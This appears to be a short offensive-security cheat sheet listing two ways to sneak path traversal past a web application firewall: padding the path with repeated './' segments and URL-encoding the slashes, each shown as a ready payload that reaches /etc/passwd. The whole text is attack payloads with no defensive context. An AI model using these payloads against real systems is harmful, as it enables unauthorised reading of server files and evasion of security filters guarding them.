# Path Traversal WAF Bypass

### 1) File Path Truncation

The number of characters depends on the WAF rule

    /././././././././././../../../etc/passwd

### 2) URL encoding

    ..%2f..%2f..%2fetc/passwd
